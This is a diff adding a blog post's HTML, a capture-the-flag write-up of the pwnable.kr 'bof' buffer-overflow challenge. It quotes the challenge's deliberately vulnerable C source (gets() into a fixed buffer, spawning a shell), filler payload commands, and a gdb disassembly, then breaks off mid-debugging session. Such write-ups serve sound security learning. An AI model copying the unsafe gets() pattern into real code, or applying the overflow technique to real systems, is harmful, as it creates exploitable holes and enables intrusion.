@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+        pwnable.kr - bof writeup - A personal cybersecurity blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="difficulty --&gt; easy" />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>pwnable.kr - bof writeup - A personal cybersecurity blog</title>
+    
+    
+    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="pwnable.kr - bof writeup" />
+<meta property="og:description" content="difficulty --&gt; easy" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/" />
+<meta property="article:published_time" content="2020-02-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-02-19T00:00:00+00:00" />
+<meta itemprop="name" content="pwnable.kr - bof writeup">
+<meta itemprop="description" content="difficulty --&gt; easy">
+<meta itemprop="datePublished" content="2020-02-19T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-02-19T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1033">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pwnable.kr - bof writeup"/>
+<meta name="twitter:description" content="difficulty --&gt; easy"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
+            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
+            
+            
+            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+        </ul>
+
+    </div>
+</div>
+
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/"
+    >pwnable.kr - bof writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/" class="article-date">
+  <time datetime="2020-02-19 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-02-19</time>
+</a>
+</span>
+
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <blockquote>
+<p>Nana told me that buffer overflow is one of the most common software
+vulnerability.
+Is that true?</p>
+<p>Download : <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a>
+Download : <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p>
+<p>Running at : nc pwnable.kr 9000</p>
+</blockquote>
+<h2 id="solution">Solution:</h2>
+<p>We get the files and run the executable bof</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>$./bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>AAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Nah..
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>$./bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Nah..
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>*** stack smashing detected ***: ./bof terminated
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Aborted
+</code></pre></div><p>The program asks for an input and on bufferoverflow, it detects stack smashing.
+We have a look at the source code bof.c</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;stdio.h&gt;</span><span style="color:#776e71">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;string.h&gt;</span><span style="color:#776e71">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71">#include</span> <span style="color:#776e71">&lt;stdlib.h&gt;</span><span style="color:#776e71">
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#776e71"></span><span style="color:#fec418">void</span> <span style="color:#06b6ef">func</span>(<span style="color:#fec418">int</span> key){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>        <span style="color:#fec418">char</span> overflowme[<span style="color:#f99b15">32</span>];
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>        printf(<span style="color:#48b685">&#34;overflow me : &#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>        gets(overflowme);       <span style="color:#776e71">// smash me!
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#776e71"></span>        <span style="color:#815ba4">if</span>(key <span style="color:#5bc4bf">==</span> <span style="color:#f99b15">0xcafebabe</span>){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>                system(<span style="color:#48b685">&#34;/bin/sh&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>        <span style="color:#815ba4">else</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>                printf(<span style="color:#48b685">&#34;Nah..</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#fec418">int</span> <span style="color:#06b6ef">main</span>(<span style="color:#fec418">int</span> argc, <span style="color:#fec418">char</span><span style="color:#5bc4bf">*</span> argv[]){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>        func(<span style="color:#f99b15">0xdeadbeef</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>        <span style="color:#815ba4">return</span> <span style="color:#f99b15">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>}
+</code></pre></div><p>We are interested in the function <code>func</code>. It is called with the argument
+<code>0xdeadbeef</code>. It takes the user input using the vulnerable <code>gets</code>
+function and writes the input to the variable <code>overflowme</code> which we are to
+smash as the code says. If the argument value key is equal to <code>0xcafebabe</code>,
+we get a shell.</p>
+<p>So, we have to overwrite the passed variable key to the function <code>func</code>
+with <code>0xcafebabe</code>. We use gdb to find the location of the variable in
+memory and overwrite using using basic buffer overflow.</p>
+<p>Initially, we run the program with a few &ldquo;A&quot;s stored in a file <code>payload</code> in
+the same directory</p>
+<pre><code class="language-shellsession" data-lang="shellsession">$python -c &quot;print('A'*32)&quot; &gt; payload
+</code></pre><p>Now, we open the program in gdb and set breakpoint at function <code>func</code> and
+run with input from the file <code>payload</code></p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) disas func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Dump of assembler code <span style="color:#815ba4">for</span> function func:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#f99b15">0x0000062c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>: push   ebp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#f99b15">0x0000062d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>: mov    ebp,esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>   <span style="color:#f99b15">0x0000062f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">3</span><span style="color:#5bc4bf">&gt;</span>: sub    esp,<span style="color:#f99b15">0x48</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>   <span style="color:#f99b15">0x00000632</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">6</span><span style="color:#5bc4bf">&gt;</span>: mov    eax,gs:<span style="color:#f99b15">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>   <span style="color:#f99b15">0x00000638</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>   <span style="color:#f99b15">0x0000063b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>   <span style="color:#f99b15">0x0000063d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">17</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x78c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>   <span style="color:#f99b15">0x00000644</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">24</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x645</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">25</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>   <span style="color:#f99b15">0x00000649</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">29</span><span style="color:#5bc4bf">&gt;</span>:  lea    eax,[ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x2c</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>   <span style="color:#f99b15">0x0000064c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">32</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>   <span style="color:#f99b15">0x0000064f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">35</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x650</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">36</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>   <span style="color:#f99b15">0x00000654</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:  cmp    DWORD PTR [ebp<span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x8</span>],<span style="color:#f99b15">0xcafebabe</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>   <span style="color:#f99b15">0x0000065b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">47</span><span style="color:#5bc4bf">&gt;</span>:  jne    <span style="color:#f99b15">0x66b</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>   <span style="color:#f99b15">0x0000065d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">49</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x79b</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>   <span style="color:#f99b15">0x00000664</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">56</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x665</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">57</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>   <span style="color:#f99b15">0x00000669</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">61</span><span style="color:#5bc4bf">&gt;</span>:  jmp    <span style="color:#f99b15">0x677</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>   <span style="color:#f99b15">0x0000066b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x7a3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>   <span style="color:#f99b15">0x00000672</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x673</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">71</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>   <span style="color:#f99b15">0x00000677</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>:  mov    eax,DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>   <span style="color:#f99b15">0x0000067a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">78</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,DWORD PTR gs:<span style="color:#f99b15">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>   <span style="color:#f99b15">0x00000681</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">85</span><span style="color:#5bc4bf">&gt;</span>:  je     <span style="color:#f99b15">0x688</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>   <span style="color:#f99b15">0x00000683</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0x684</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">88</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>   <span style="color:#f99b15">0x00000688</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:  leave  
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>   <span style="color:#f99b15">0x00000689</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">93</span><span style="color:#5bc4bf">&gt;</span>:  ret    
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>End of assembler dump<span style="color:#5bc4bf">.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>(gdb) b func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Breakpoint <span style="color:#f99b15">1</span> at <span style="color:#f99b15">0x632</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>(gdb) r <span style="color:#5bc4bf">&lt;</span> payload
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Starting program: <span style="color:#5bc4bf">/</span>home<span style="color:#5bc4bf">/</span>fmash<span style="color:#5bc4bf">/</span>ctf<span style="color:#5bc4bf">/</span>pwnable<span style="color:#5bc4bf">/</span>toddler<span style="color:#48b685">&#39;s_bottle/bof/bof &lt; payload</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>
